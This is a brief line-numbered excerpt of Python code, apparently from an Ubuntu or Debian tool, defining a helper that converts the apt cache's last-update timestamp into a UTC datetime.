   327	
   328	    return None
   884	def get_apt_cache_datetime() -> Optional[datetime.datetime]:
   885	    cache_time = get_apt_cache_time()
   886	    if cache_time is None:
   887	        return None
   888	    return datetime.datetime.fromtimestamp(cache_time, datetime.timezone.utc)
